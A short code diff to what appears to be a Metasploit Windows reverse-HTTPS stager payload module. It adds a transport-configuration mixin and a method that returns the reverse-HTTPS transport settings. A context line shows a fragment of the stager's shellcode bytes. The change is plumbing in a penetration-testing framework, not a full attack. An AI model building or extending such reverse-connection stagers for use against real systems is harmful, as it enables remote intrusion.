@@ -5,12 +5,14 @@
 
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/handler/reverse_https'
 
 module Metasploit3
 
   CachedSize = 578
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Stager
   include Msf::Payload::Windows
 
@@ -89,6 +91,13 @@ module Metasploit3
             "\xE8\xD7\xFE\xFF\xFF" #updated jump offset
         }
     ))
+  end
+
+  #
+  # Generate the transport-specific configuration
+  #
+  def transport_config(opts={})
+    transport_config_reverse_https(opts)
   end
 
   #
